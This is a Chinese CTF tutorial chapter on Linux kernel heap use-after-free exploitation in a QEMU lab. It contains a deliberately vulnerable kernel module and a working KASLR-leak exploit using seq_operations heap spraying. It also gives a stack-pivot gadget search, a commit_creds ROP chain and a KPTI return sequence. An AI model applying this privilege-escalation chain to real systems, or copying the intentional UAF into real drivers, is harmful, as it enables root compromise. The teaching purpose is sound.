---
chapter: PWN
section: Kernel PWN 堆利用
order: 319
tags:
  - CTF
  - PWN
  - Kernel
  - 堆
publish: true
---

# P19 内核堆利用与 UAF
## Kernel Heap Exploitation and UAF

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L4 高级与实战期 ｜ **前置要求**：[[P18-KernelPWN入门|P18]] · [[P12-glibc堆管理机制|P12]] · [[P17-堆风水与通用利用思路|P17]]
> **本章目标**：把内核侧的堆讲清楚：SLUB 分配器的对象缓存模型（缓存家族、对象复用、freelist、专用缓存与合并），内核模块里的分配接口，然后用一个带 ALLOC/FREE/READ/WRITE 四个 ioctl 的漏洞模块把 UAF 完整走两遍——堆喷占位后释放后读泄露内核基址破 KASLR，释放后写覆盖函数指针、经栈迁移 gadget 落进 ROP 链提权，按 KPTI 的规矩回用户态拿 shell；最后把 [[P18-KernelPWN入门#11. 配套练习与延伸阅读|P18 配套练习]]留下的 babydriver 完整复盘一遍。全部演示跑在与 P18 同一份 bzImage 上（x86-64 Linux，内核 7.0.0-38-generic），启动命令带 `pti=on`、不带 `nokaslr`——KASLR 与 KPTI 全程开启；CPU 型号仍是 qemu64（无 SMEP/SMAP），这个边界在第 5 节末尾单独交代。

## 1. 从用户态堆到内核堆：SLUB 的对象缓存

[[P12-glibc堆管理机制|P12]] 里 glibc 的堆是一大块内存按请求切成大小不等的 chunk；内核不用 ptmalloc。内核小内存分配走 ==SLUB 分配器==：每种尺寸类一个对象缓存（object cache），整页内存预先切成等大的对象，`kmalloc(32)` 从 32 字节类的缓存里拿一格，`kfree` 还回去。与用户态堆最接近的对照是 tcache——都是"同尺寸 freelist、后进先出"，[[P14-tcache与fastbin利用|P14]] 的对象复用直觉原样迁移过来。

### 1.1 缓存家族：一个尺寸类不止一个缓存

`kmalloc(size, flags)` 的第一参数决定尺寸类，第二参数 flags 决定从哪个家族的缓存拿。现代内核把通用缓存分成了几族，本内核（7.0.0-38-generic）的 32 字节类在 `/proc/slabinfo` 里同框出现：

```bash
grep -E '^(kmalloc-32|kmalloc-cg-32|kmalloc-rcl-32|kmalloc-rnd-01-32|kmalloc-rnd-15-32) ' /proc/slabinfo
```

输出：

```
kmalloc-cg-32        120    128     32  128    1 : tunables    0    0    0 : slabdata      1      1      0
kmalloc-rcl-32         0      0     32  128    1 : tunables    0    0    0 : slabdata      0      0      0
kmalloc-rnd-15-32    120    128     32  128    1 : tunables    0    0    0 : slabdata      1      1      0
kmalloc-rnd-01-32    600    640     32  128    1 : tunables    0    0    0 : slabdata      5      5      0
kmalloc-32           300    384     32  128    1 : tunables    0    0    0 : slabdata      3      3      0
```

五行的 objsize 都是 32，却是五个互不相通的缓存。选择逻辑在发行版头文件 `include/linux/slab.h` 的 `kmalloc_type()` 里（摘录）：

```c
static __always_inline enum kmalloc_cache_type kmalloc_type(gfp_t flags,
                                                            unsigned long caller)
{
	/* 无特殊标志的普通分配：按调用地址散列，落进 15 个随机桶之一 */
	if (likely((flags & KMALLOC_NOT_NORMAL_BITS) == 0))
		return KMALLOC_RANDOM_START +
		       hash_64(caller ^ random_kmalloc_seed,
		               ilog2(RANDOM_KMALLOC_CACHES_NR + 1));
	...
	/* __GFP_RECLAIMABLE -> kmalloc-rcl-*；__GFP_ACCOUNT -> kmalloc-cg-* */
	if (!IS_ENABLED(CONFIG_MEMCG) || (flags & __GFP_RECLAIMABLE))
		return KMALLOC_RECLAIM;
	else
		return KMALLOC_CGROUP;
}
```

对照 `/proc/slabinfo` 的行名，规则可以列成一张表：

| 分配标志 | 缓存家族 | 桶的选取 |
| ---- | ---- | ---- |
| `GFP_KERNEL`（普通） | `kmalloc-rnd-NN-*` 共 15 个 + 无后缀的 `kmalloc-*` | `hash_64(调用地址 ^ seed)` 取模 16，seed 每次启动随机 |
| `GFP_KERNEL \| __GFP_ACCOUNT` | `kmalloc-cg-*` | 固定，不分桶 |
| `GFP_KERNEL \| __GFP_RECLAIMABLE` | `kmalloc-rcl-*` | 固定，不分桶 |

两点直接决定利用能不能成立。其一，==两个分配要占同一格，必须落在同一家族甚至同一个桶==：普通 `GFP_KERNEL` 的分配按调用点散列进随机桶，散列值掺了每次启动随机的 seed——模块里一个调用点和内核里另一个调用点同桶的概率只有 1/16，逐次启动还会变。带 `__GFP_ACCOUNT` 的分配没有随机桶，同尺寸必同缓存，这是本章堆喷选型的根据（4.1、7.3 各有一次落地）。其二，`kmalloc-rnd-*` 是 `CONFIG_RANDOM_KMALLOC_CACHES` 开出来的缓解：把不同调用点的对象隔进不同桶，专门抬高"占位对象随便挑"这类跨对象利用的成本——老的内核堆教程没有这一层，照搬会直接扑空。

对象复用的顺序与 tcache 一致：`kfree` 把对象头插回 freelist，下一次同家族同尺寸的 `kmalloc` 先拿到它。观察这个性质不需要调试器，一次批量的泄漏式分配就能在 slabinfo 里看出页数增长：

```c
/* uaf_alloc100.c —— 连续 ALLOC 100 次 32 字节（源码见 2.2 的模块） */
int main(void)
{
	int fd, i;

	fd = open("/dev/uafdev", O_RDONLY);
	for (i = 0; i < 100; i++)
		ioctl(fd, UAF_ALLOC, 32);   /* 每次覆盖全局指针，旧块全部泄漏 */
	return 0;
}
```

```bash
grep '^kmalloc-cg-32 ' /proc/slabinfo
/home/ctf/uaf_alloc100
grep '^kmalloc-cg-32 ' /proc/slabinfo
```

输出：

```
kmalloc-cg-32        120    128     32  128    1 : tunables    0    0    0 : slabdata      1      1      0
[*] 100 x kmalloc(32) issued (all leaked)
kmalloc-cg-32        180    256     32  128    1 : tunables    0    0    0 : slabdata      2      2      0
```

100 次分配全部泄漏：原页 128 格只剩 8 个空位，装不下就新开一页——`slabdata` 从 1 到 2、对象总数从 128 到 256；active 增量 60 与 100 的差值来自观察窗口里内核自身的分配与释放。==泄漏、喷射、对账，内核堆的观察手段就是这一个文件==。

> [!info]- 观察接口：/proc/slabinfo 与 /sys/kernel/slab
> `/proc/slabinfo` 属主 root、权限 0400，每行一个缓存：`active_objs num_objs objsize objperslab pagesperslab`，行尾的 `slabdata` 两列是"活跃页数/总页数"。`/sys/kernel/slab/<缓存名>/` 是每缓存一个目录，`object_size`（对象大小）、`slab_size`（含元数据的真实步长）、`aliases`（合并进来的别名数）等文件各有用途，本章 1.3 会用到前两个。这两个接口都要求 `CONFIG_SLUB_DEBUG`（Ubuntu 默认开）。

### 1.2 专用缓存与缓存合并

不是所有对象都挤在 kmalloc 家族里。高频或敏感的结构体会用 `kmem_cache_create()` 建专用缓存——本内核里 `seq_file` 就是独立一行：

```
seq_file              60     68    120   34    1 : tunables    0    0    0 : slabdata      2      2      0
```

反过来，源码里的专用缓存也可能在 slabinfo 里==查无此名==：源码创建 `cred_jar`（`struct cred` 的缓存，[[P18-KernelPWN入门#5.1 cred：内核里的"我是谁"|P18 5.1]] 提过它的用途）时没有禁用合并，`CONFIG_SLAB_MERGE_DEFAULT=y` 下它被并进参数兼容的既有缓存，slabinfo 只显示合并后的代表缓存名：

```bash
grep -i cred /proc/slabinfo
```

输出：

```
(no entry named *cred*)
```

==合并的判据是"对象尺寸、对齐、标志全兼容"==：合并后的缓存共用同一套 freelist，`cred_jar` 的分配与同家族同尺寸的其他对象可以互相占位。堆喷时不必纠结对象在源码里叫什么名字，只要它落到 slabinfo 的同一行，就能互相复用格子。

### 1.3 freelist 指针在哪：释放后读先读什么

freelist 的"next"存在哪，决定 free 之后悬垂读会看到什么。演进分三代：

1. 最老的 SLUB 把 next 指针放在对象开头——free 后读第一格就是元数据，等于白送一个堆泄露；
2. 5.7 起改为放进对象中部并做编码（`CONFIG_SLAB_FREELIST_HARDENED`，指针与随机数、自身地址异或后存储）；
3. 更新的内核干脆把 freelist 指针挪出对象本体。本内核属于第三种，直接量元数据：

```bash
cat /sys/kernel/slab/kmalloc-cg-32/object_size /sys/kernel/slab/kmalloc-cg-32/slab_size
```

输出：

```
32
32
```

`object_size` 与 `slab_size` 相等——对象体外没有额外元数据空间，freelist 指针存在 slab 页自己的管理区里。4.4 的输出块会看到对应的运行期行为：释放后的对象体内容原样保留，悬垂读读到的是上一个使用者留下的数据，而不是堆元数据。

> [!info]- 老内核的对照形状
> 在 5.x–6.x 一批内核上做同样的实验，free 后读对象中部（32 字节对象是 +0x10）会看到一个"乱掉的四字"——那就是编码后的 freelist 指针（指针 ^ 按位反转 ^ 随机数 ^ 自身地址，每次启动不同）。老内核教程里"free 后先读一格堆元数据"的起手式对应这个形状；在新内核上这一步拿不到东西，泄露必须换路线——靠占位对象自身的内核指针，正是第 4 节的做法。

## 2. 内核模块的堆接口与漏洞模块

### 2.1 分配接口一分钟

内核模块能用的堆接口就是三个函数加一对拷贝：

- `kmalloc(size, flags)` / `kzalloc(size, flags)`：按 1.1 的规则取格，`kzalloc` 多做一次清零；
- `kfree(ptr)`：还格。==参数为 NULL 不出事，重复释放是另一回事==；
- `copy_to_user(用户缓冲, 内核缓冲, n)` / `copy_from_user(内核缓冲, 用户缓冲, n)`：跨界搬运，[[P18-KernelPWN入门#4. 内核模块与漏洞模块|P18 4.2]] 已在栈溢出模块里用过 `copy_from_user`/`get_user`，这对函数同时是 hardened usercopy 检查的必经之路——从 slab 对象向外拷贝的字节数超过该缓存的对象尺寸会当场 `BUG`。

flags 的最小集合两个值够用：`GFP_KERNEL`（普通睡眠分配）与 `GFP_KERNEL | __GFP_ACCOUNT`（记账分配，落 `kmalloc-cg-*` 家族）。其余标志（`GFP_ATOMIC`、`GFP_DMA` 等）遇到再查，不影响本章。

### 2.2 漏洞模块：ALLOC / FREE / READ / WRITE

教学用 UAF 模块 `uafdev.c`——全局指针 `gbuf` 指向一块堆内存，ioctl 提供四个操作，其中 FREE 释放后不清指针，这就是全部漏洞（x86-64 Linux，内核 7.0.0-38-generic）：

```c
/* uafdev.c —— 教学用 UAF 漏洞内核模块
 *   UAF_ALLOC  arg = size ：gbuf = kmalloc(size)；旧指针直接被覆盖（泄漏）
 *   UAF_FREE   无参数     ：kfree(gbuf)。漏洞点：指针不清空
 *   UAF_READ   arg = &req ：把 gbuf 处 req.len 字节拷给用户（悬垂读）
 *   UAF_WRITE  arg = &req ：把用户 req.buf 处 req.len 字节写进 gbuf（悬垂写）
 * 注册成 misc 字符设备 /dev/uafdev，权限 0666。 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#define UAF_ALLOC 0x5001
#define UAF_FREE  0x5002
#define UAF_READ  0x5003
#define UAF_WRITE 0x5004

struct uaf_req {
	void __user *buf;
	size_t len;
};

static char *gbuf;      /* 全局指针：free 之后不清空，构成 UAF */
static size_t gsize;

static long uaf_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
	struct uaf_req req;

	switch (cmd) {
	case UAF_ALLOC: {
		size_t size = arg;

		if (size < 8 || size > 4096)
			return -EINVAL;
		/* 旧的 gbuf 直接被覆盖（内存泄漏），不做释放。
		 * GFP_KERNEL_ACCOUNT：与 single_open 等 ACCOUNT 分配同走
		 * kmalloc-cg-* 家族，堆喷才能把释放的格子占回来（见正文）。 */
		gbuf = kmalloc(size, GFP_KERNEL_ACCOUNT);
		if (!gbuf)
			return -ENOMEM;
		gsize = size;
		pr_info("uafdev: alloc size=%zu buf=0x%px\n", gsize, gbuf);
		return 0;
	}
	case UAF_FREE:
		if (!gbuf)
			return -EINVAL;
		kfree(gbuf);
		/* 漏洞：这里本该 gbuf = NULL，故意不做 */
		pr_info("uafdev: free buf=0x%px (pointer kept)\n", gbuf);
		return 0;
	case UAF_READ:
		if (!gbuf)
			return -EINVAL;
		if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
			return -EFAULT;
		if (req.len > gsize)
			return -EINVAL;
		if (copy_to_user(req.buf, gbuf, req.len))
			return -EFAULT;
		return 0;
	case UAF_WRITE:
		if (!gbuf)
			return -EINVAL;
		if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
			return -EFAULT;
		if (req.len > gsize)
			return -EINVAL;
		if (copy_from_user(gbuf, req.buf, req.len))
			return -EFAULT;
		return 0;
	default:
		return -ENOTTY;
	}
}

static const struct file_operations uaf_fops = {
	.owner          = THIS_MODULE,
	.unlocked_ioctl = uaf_ioctl,
};

static struct miscdevice uaf_misc = {
	.minor = MISC_DYNAMIC_MINOR,
	.name  = "uafdev",
	.fops  = &uaf_fops,
	.mode  = 0666,
};

static int __init uafdev_init(void)
{
	pr_info("uafdev: loaded (misc major 10)\n");
	return misc_register(&uaf_misc);
}

static void __exit uafdev_exit(void)
{
	misc_deregister(&uaf_misc);
}

module_init(uafdev_init);
module_exit(uafdev_exit);
MODULE_LICENSE("GPL");
```

三处设计与利用直接相关。其一，READ/WRITE 的长度上限是分配时的 `gsize`：悬垂之后这个上限管的是**拷贝长度**而不是目标合法性——格子被谁占去，这 len 字节就读写谁。其二，分配标志带 `__GFP_ACCOUNT`，让模块的分配与第 4 节的堆喷对象落在同一家族（1.1 的表）。其三，ALLOC 不释放旧块，配合 1.1 的 slabinfo 观察能直接看到分配行为。编译按 [[P18-KernelPWN入门#4.3 编译与量偏移|P18 4.3]] 同一个 Makefile（`obj-m` 换成本章两个模块），vermagic 必须与 bzImage 同源。

装载与设备节点（模块由 initramfs 的 init 脚本装载，输出是启动控制台上的 insmod 日志）：

```
[    2.442937] uafdev: loading out-of-tree module taints kernel.
[    2.443083] uafdev: module verification failed: signature and/or required key missing - tainting kernel
[    2.448567] uafdev: loaded (misc major 10)
[    2.454024] babydev: loaded (misc major 10)
```

taint 两条是无签名模块的固定代价（[[P18-KernelPWN入门#4. 内核模块与漏洞模块|P18 4.1]] 折叠框）。装载后 misc 设备自动出现：

```bash
ls -l /dev/uafdev /dev/babydev
```

输出：

```
crw-rw-rw-    1 root     root       10, 263 Oct 25 09:45 /dev/babydev
crw-rw-rw-    1 root     root       10, 262 Oct 25 09:45 /dev/uafdev
```

`/dev/babydev` 是第 7 节 babydriver 复盘用的第二个模块，此处一并装好。

> [!info]- 本章的运行环境与演示流程
> rootfs 的拼装、打包与 QEMU 启动脚本按 [[P18-KernelPWN入门#3. 环境搭建（二）：busybox 根文件系统与 QEMU 启动|P18 第 3 节]]原样复用，差异三处：多挂一次 devpts（`mkdir /dev/pts && mount -t devpts none /dev/pts`，第 7 节的管道需要）、rootfs 里多装本章两个模块、init 脚本增加一个演示分支——读取内核命令行里的 `demo=<名字>`，以 uid 1000（`root_` 前缀则以 root）执行 rootfs 里的 `/demo_<名字>.sh` 后自动关机。启动命令与 P18 3.2 相同，只把 `-append` 换成 `"console=ttyS0 pti=on"`：==不写 `nokaslr`、显式开 KPTI==。各输出块的 `### demo: <名字> ###` 标记就是这条自动演示路径的痕迹；手工复现时启动后手动执行相同命令，输出一致。另外 init 里沿用 P18 的设定放开 `kptr_restrict` 与 `perf_event_paranoid`，普通用户可读 `/proc/kallsyms`——只为对账方便，泄露本身不依赖它。

## 3. UAF 漏洞模型：free 之后指针还在

use-after-free 的定义与用户态同源（[[P13-基础堆漏洞|P13]]）：==释放动作只把内存还给分配器，不通知仍在引用它的指针==。`uafdev` 的 FREE 之后：

- `gbuf` 仍指向那格内存——==悬垂指针==；
- UAF_READ：读 32 字节，读到的是"这格内存现在的内容"——free 后、占位前是旧数据（1.3：新内核不再暴露堆元数据），占位后就是占位对象的内容——==释放后读原语==；
- UAF_WRITE：写 32 字节，写进"现在占着这格内存的对象"——若占位的是含函数指针的内核结构，就是一次受控的内核写——==释放后写原语==。

两个原语的威力都取决于"谁占回了这格内存"，而这恰好由 SLUB 的复用规则（1.1）决定：free 把格子推回 freelist 头，紧接着的同家族同尺寸分配一定先拿到它。于是标准的攻击节奏是：

1. ALLOC + FREE：制造悬垂指针；
2. ==堆喷==（heap spray）：批量触发含目标结构的分配，把格子占回来（堆喷与堆风水的内核版，思路与 [[P17-堆风水与通用利用思路|P17]] 同源）；
3. 悬垂读 → 泄露内核地址（第 4 节）；
4. 悬垂写 → 覆盖占位对象里的函数指针 → 劫持控制流（第 5 节）。

> [!warning] double free 在同一个模型里
> FREE 不清指针的另一个后果是 FREE 可以连按：第二次 UAF_FREE 会对同一格 `kfree` 两次。SLUB 对重复释放的防御有限，但本章的路线用不到它——同一个悬垂指针反复 READ/WRITE 就足够了，第 4、5 节的每次泄露与劫持都是"free 一次、喷一次、读写多次"。别把 double free 混进 payload 无意间触发。

## 4. 原语一：堆喷占位与释放后读，破 KASLR

### 4.1 占位对象选型：seq_operations

占位对象要同时满足四条：

| 要求 | 为什么 | seq_operations 的答案 |
| ---- | ---- | ---- |
| 与悬垂块同一家族、同尺寸类 | 不同家族/桶不互相占位（1.1） | 4 个函数指针 = 32 字节；`single_open` 用 `kmalloc(sizeof(*op), GFP_KERNEL_ACCOUNT)` 分配——与模块同走 `kmalloc-cg-32` |
| 内容含内核指针 | 泄露的对象 | 四个四字全是内核函数地址 |
| 用户态一条调用就批量分配 | 堆喷要快 | `open("/proc/self/stat")` 即分配一个 |
| 占位后系统继续正常工作 | 误喷不崩 | 打开的 /proc 文件不读不关就静静待着 |

`/proc/self/stat` 的打开路径走 `proc_single_open` → `single_open`：分配一个 `seq_operations`（内核的函数指针表，[[P18-KernelPWN入门#4. 内核模块与漏洞模块|P18 4.1]] 讲过 file_operations 这类表在内核里的角色），四个槽位分别填 `single_start`、`single_next`、`single_stop` 和该文件自己的 show 函数。exp 泄露的就是这张表。

### 4.2 exploit：写模式、释放、喷射、读回

```c
/* exp_leak.c —— UAF 泄露内核基址（破 KASLR）（x86-64 Linux，内核 7.0）
 * 偏移来自随 bzImage 的 System.map（[[P18-KernelPWN入门#2.3 符号从哪来：System.map|P18 2.3]]）。 */
#define OFF_SINGLE_START 0x0929cd0
#define OFF_SINGLE_STOP  0x0929d30
#define OFF_SINGLE_NEXT  0x0929d00
#define SPRAY 256

int main(void)
{
	struct uaf_req rq;
	unsigned long quads[4], base, kallsyms_text;
	int fds[SPRAY], fd, i;

	fd = open("/dev/uafdev", O_RDONLY);

	ioctl(fd, UAF_ALLOC, 32);
	memset(quads, 0x41, sizeof(quads));
	rq.buf = quads;  rq.len = 32;
	ioctl(fd, UAF_WRITE, &rq);      /* 填进可辨认的模式串 */
	ioctl(fd, UAF_FREE);

	/* 释放后先读一次：新内核的 freepointer 在对象体外（1.3），
	 * 悬垂读看到的是写进去的模式串本身 */
	memset(quads, 0, sizeof(quads));
	rq.buf = quads;  rq.len = 32;
	ioctl(fd, UAF_READ, &rq);

	/* 堆喷：open 即分配一个 seq_operations 进 kmalloc-cg-32 */
	for (i = 0; i < SPRAY; i++)
		fds[i] = open("/proc/self/stat", O_RDONLY);

	/* 再读：悬垂指针指向的格子已被某个 seq_operations 占回 */
	memset(quads, 0, sizeof(quads));
	rq.buf = quads;  rq.len = 32;
	ioctl(fd, UAF_READ, &rq);

	base = quads[0] - OFF_SINGLE_START;   /* 泄露 -> 内核基址 */
	printf("[*] single_start @ 0x%lx -> kernel base = 0x%lx\n", quads[0], base);
	/* 偏移对账：quad1/quad2 应分别等于 single_stop/single_next + base */
	printf("[*] offset check: stop %s, next %s\n",
	       (quads[1] - base == OFF_SINGLE_STOP) ? "match" : "MISMATCH",
	       (quads[2] - base == OFF_SINGLE_NEXT) ? "match" : "MISMATCH");
	/* 与 /proc/kallsyms 的 _text 对账（教学 init 放开了 kptr_restrict） */
	kallsyms_text = ksym_from("/proc/kallsyms", "_text");
	printf("[*] /proc/kallsyms _text = 0x%lx : %s\n", kallsyms_text,
	       kallsyms_text == base ? "MATCH" : "MISMATCH");
	...
}
```

`ksym_from` 是从 `/proc/kallsyms` 按名字取地址的固定小函数（[[P18-KernelPWN入门#5.2 ret2usr：让内核执行用户态的函数|P18 5.2]] 的 `ksym` 原样复用），完整源码随附件。一次完整运行：

```
### demo: leak ###
uid=1000(ctf) gid=1000(ctf)
[    2.548866] uafdev: alloc size=32 buf=0xffff8f43c139bbc0
[    2.549336] uafdev: free buf=0xffff8f43c139bbc0 (pointer kept)
[*] freed chunk, before spray:
    +00 = 0x4141414141414141
    +08 = 0x4141414141414141
    +10 = 0x4141414141414141
    +18 = 0x4141414141414141
[*] sprayed 256 /proc/self/stat (seq_operations, kmalloc-cg-32)
[*] after spray:
    +00 = 0xffffffff99329cd0
    +08 = 0xffffffff99329d30
    +10 = 0xffffffff99329d00
    +18 = 0xffffffff993c9c30
[*] single_start @ 0xffffffff99329cd0 -> kernel base = 0xffffffff98a00000
[*] offset check: stop match, next match
[*] /proc/kallsyms _text = 0xffffffff98a00000 : MATCH
[    2.587776] ACPI: PM: Preparing to enter system sleep state S5
[    2.588878] reboot: Power down
```

逐段对照：

- free 后读回四个 `0x41` 四字——写进去的模式串原样保留，印证 1.3：==新内核释放后读不到堆元数据==，这一步只是确认悬垂读通路；
- 喷射后 +00 变成 `0xffffffff99329cd0`：这就是本次启动的 `single_start` 运行期地址。四个四字减去基址 `0xffffffff98a00000`，偏移分别为 `0x929cd0 / 0x929d30 / 0x929d00 / 0x9c9c30`——对照 System.map，前三个正是 `single_start / single_stop / single_next`，第四个是 `/proc/self/stat` 的 show 函数 `proc_single_show`，与 4.1 的表布局完全一致；
- `match`、`MATCH` 两行是两重对账：泄露值自洽（同一基址减出两个已知偏移），且与 `/proc/kallsyms` 的 `_text` 一致——==KASLR 之下每次启动基址都不同==（对照第 5 节输出块里的 `0xffffffff8be00000`），但按 2MB 对齐（所有输出块的基址低位全 0），所以"泄露值 - System.map 偏移"永远等于基址。

==一个函数指针 + 一次悬垂读，KASLR 就没了==。接下来把悬垂写兑换成控制流。

> [!info]- 喷射量的取值与失败形状
> 256 个 fd 远超需要的最小量：SLUB 后进先出，FREE 之后第一次 `open` 大概率就占回目标格。喷射量是保险，不是必要条件。三个常见的失败形状：喷射前多打了 printf 导致内核日志路径先占走格子（4.2 的代码把喷射前的输出全部收窄）；fd 打到进程上限（`ulimit -n`）；占位对象选错家族——读回仍是 `0x41` 模式串就是这条，回到 1.1 的表核对分配标志。

## 5. 原语二：释放后写，劫持控制流

### 5.1 调用现场：函数指针被调用时的寄存器

悬垂写能改掉 `seq_operations->start`，但要决定"改成什么"，先得知道它被调用时的现场。反汇编本次内核的 `seq_read_iter`（读 `/proc` seq 文件时 `start` 的调用点）：

```bash
objdump -d -M intel --start-address=0xffffffff8192b4af --stop-address=0xffffffff8192b4ca vmlinux
```

输出：

```asm
; x86-64 Linux（vmlinux 7.0.0-38-generic）
ffffffff8192b4af:	49 8b 46 58          	mov    rax,QWORD PTR [r14+0x58]   ; rax = m->op
ffffffff8192b4b3:	49 c7 46 10 00 00 00 00 	mov    QWORD PTR [r14+0x10],0x0
ffffffff8192b4bb:	49 8d 76 28          	lea    rsi,[r14+0x28]             ; rsi = m+0x28
ffffffff8192b4bf:	4c 89 f7             	mov    rdi,r14                    ; rdi = m（seq_file*）
ffffffff8192b4c2:	48 8b 00             	mov    rax,QWORD PTR [rax]        ; rax = op->start
ffffffff8192b4c5:	e8 b6 1b e1 00       	call   0xffffffff8273d080
```

`0xffffffff8273d080` 查 System.map 是 `__x86_indirect_thunk_rax`——内核开了 retpoline 缓解，所有间接调用都经这种跳板（[[P18-KernelPWN入门#4.2 写漏洞模块：从 copy_from_user 到 get_user 循环|P18 4.2]] 反汇编尾部的返回桩是同族机制）。跳板的语义是"跳到 rax 的值"，所以==进入 start 时：rdi = seq_file 指针、rsi 指向 seq_file 内部、rax = start 槽位里的值本身==——三个寄存器没有一个装着用户可控的数据。

这排除了几条想当然的路：把 start 直接改成 `commit_creds` 之类提权函数，rdi 是 seq_file 指针，参数不对；把 start 改成某个"迁移后串内核代码"的 gadget，也需要栈上有受控数据——调用现场栈顶是返回地址，后面是 `seq_read_iter` 自己的帧，都不受控。先看看迁移 gadget 的库存再下结论：

```bash
python3 find_rsp_pivots.py vmlinux    # 搜 mov/xchg/lea rsp,<reg|mem> ; ret 与 pop rsp ; ret
```

输出（节选）：

```
mov rsp,rax ; ret      (none)
mov rsp,rcx ; ret      (none)
mov rsp,rdx ; ret      (none)
mov rsp,rsi ; ret      (none)
mov rsp,rdi ; ret      (none)
xchg rsp,rax ; ret     (none)
xchg rsp,rsi ; ret     (none)
mov rsp,[rax] ; ret    (none)
mov rsp,[rsi] ; ret    (none)
mov rsp,[rdi] ; ret    (none)
pop rsp ; ret          0xffffffff8124d5ce 0xffffffff8130a424 0xffffffff8136b588
--- mov rsp,[rdi+d8] ; ret ---
  (none)
```

```bash
python3 find_esp_gadgets.py vmlinux   # 搜 32 位 esp/eax 家族
```

输出（节选）：

```
xchg eax,esp ; ret         0xffffffff8120f1a8 0xffffffff8121681b 0xffffffff812f3c68 0xffffffff8131bb11 0xffffffff81372a12
mov esp,eax ; ret          (none)
xchg esp,eax ; ret         (none)
push rax ; pop rsp ; ret   (none)
pop rdi ; ret              0xffffffff812a7b9d 0xffffffff812d4b23 0xffffffff812d9d2f 0xffffffff81429de0 0xffffffff8142a73c
```

搜索方法沿 [[P18-KernelPWN入门#6.2 在 vmlinux 上搜 gadget|P18 6.2]] 的字节模式搜索：解析 vmlinux 的可执行段、按虚拟地址报告命中、逐个反汇编核对。结论分两半：`mov rsp,寄存器/内存` 一族==一条都没有==；`pop rsp ; ret` 有货，但吃栈顶受控值，现场给不出来。真正可用的是 32 位的 `xchg eax,esp ; ret`——它把 rsp 换成 rax 的低 32 位。rax 是什么？==start 槽位里的值==，也就是我们写进去的 gadget 地址。核对反汇编：

```bash
objdump -d -M intel --start-address=0xffffffff8120f1a8 --stop-address=0xffffffff8120f1aa vmlinux
```

输出：

```asm
ffffffff8120f1a8:	94                   	xchg   esp,eax
ffffffff8120f1a9:	c3                   	ret
```

链起来读一遍：悬垂写把 start 槽改成 `0x…8c00f1a8`（这个 gadget 的运行期地址）→ read 触发 `seq_read_iter` → 跳板跳进 gadget，rax = `0xffffffff8c00f1a8` → `xchg esp,eax` 把 rsp 设成它的低 32 位 `0x8c00f1a8` → `ret` 从 `0x8c00f1a8` 处的内存弹下一个地址。`0x8c00f1a8` 是个普通用户地址——==把这一页提前 `mmap` 好，ROP 链摆在 gadget 低 32 位的偏移处，内核的 ret 就落进链里==。xchg 会把 rax 的高 32 位清零（32 位运算零扩展），丢掉的是旧 rsp 的高位，而旧 rsp 此刻已不需要。SMAP 关闭（qemu64）是这条链的前提：内核 ret 要反复读用户页上的链；SMAP 开启时的替代路线见 5.5。

### 5.2 ROP 链与 KPTI 收尾

链的目标与 [[P18-KernelPWN入门#6.1 思路：把"跳用户态"换成"串内核自己的代码"|P18 6.1]] 相同：`commit_creds` 提权。提权函数取 `commit_creds(&init_cred)`——`init_cred` 是内核自备的全 root 凭据，`pop rdi ; ret` 一格装参数即可（`prepare_kernel_cred(0)` 的老写法只适用 6.2 之前的内核，[[P18-KernelPWN入门#5.1 cred：内核里的"我是谁"|P18 5.1]] 有版本注记）。链上各偏移：

| 常量 | 基址相对偏移 | 来源 |
| ---- | ---- | ---- |
| `pop rdi ; ret` | `0x2a7b9d` | vmlinux 字节搜索 + objdump 核对（P18 6.2 同址） |
| `init_cred` | `0x2a15b80` | System.map |
| `commit_creds` | `0x48a7e0` | System.map |
| KPTI 收尾入口 | `0x11dc` | vmlinux 反汇编（下文） |
| `xchg esp,eax ; ret` | `0x20f1a8` | vmlinux 字节搜索 + objdump 核对 |
| `single_start` | `0x929cd0` | System.map（第 4 节泄露用） |

链的最后一格是回用户态的收尾。KPTI 开启（本环境 `pti=on`），内核页表不含用户映射，裸 `iretq` 的方案走不通，标准做法是借内核自己的返回路径——[[P18-KernelPWN入门#6.3 链的收尾：回到用户态|P18 6.3]] 分析过 `swapgs_restore_regs_and_return_to_usermode`，当时的结论是"切入偏移每颗内核现场量"。本内核量出来的形状：从符号基址 +0x6c（`0xffffffff810011dc`）切入，那里是一条 `mov rdi,rsp`：

```asm
; x86-64 Linux（vmlinux，KPTI 收尾路径；符号基址 0xffffffff81000000）
ffffffff810011dc:	48 89 e7             	mov    rdi,rsp
ffffffff810011df:	65 48 8b 25 1d 8e 40 03 	mov    rsp,QWORD PTR gs:[rip+0x3408e1d]  ; 换到内核自备栈
ffffffff810011e7:	ff 77 30             	push   QWORD PTR [rdi+0x30]
ffffffff810011ea:	ff 77 28             	push   QWORD PTR [rdi+0x28]
ffffffff810011ed:	ff 77 20             	push   QWORD PTR [rdi+0x20]
ffffffff810011f0:	ff 77 18             	push   QWORD PTR [rdi+0x18]
ffffffff810011f3:	ff 77 10             	push   QWORD PTR [rdi+0x10]
ffffffff810011f6:	ff 37                	push   QWORD PTR [rdi]
ffffffff810011f8:	50                   	push   rax
		...（mov cr3 切回用户态页表）...
ffffffff8100123a:	58                   	pop    rax
ffffffff8100123b:	5f                   	pop    rdi
ffffffff8100123c:	e9 6e ff ff ff       	jmp    0xffffffff810011af    ; swapgs -> test -> 0x1261
ffffffff81001261:	f6 44 24 20 04       	test   BYTE PTR [rsp+0x20],0x4
ffffffff81001268:	48 cf                	iretq
```

读法：`mov rdi,rsp` 记下链上当前位置，切到内核自备栈后按 `+0x30 → +0x00` 的顺序从链上搬六个四字（最后再压 rax），切完页表弹回 rax 与 rdi，再经 `swapgs` 走到 `iretq`——弹的正是刚搬的六格里后五格。于是==链在收尾入口之后要摆七个四字==：

| 链上位置 | 内容 | 去向 |
| ---- | ---- | ---- |
| +0x00 | 任意值（0 即可） | 回到用户态后的 rdi |
| +0x08 | —— | 该路径不读 +0x08，摆 0 占位 |
| +0x10 | `win_land`（用户态落点） | iret 帧：rip |
| +0x18 | 保存的 cs | cs（低两位须为 3） |
| +0x20 | 保存的 rflags | rflags |
| +0x28 | 对齐过的用户 rsp | rsp |
| +0x30 | 保存的 ss | ss |

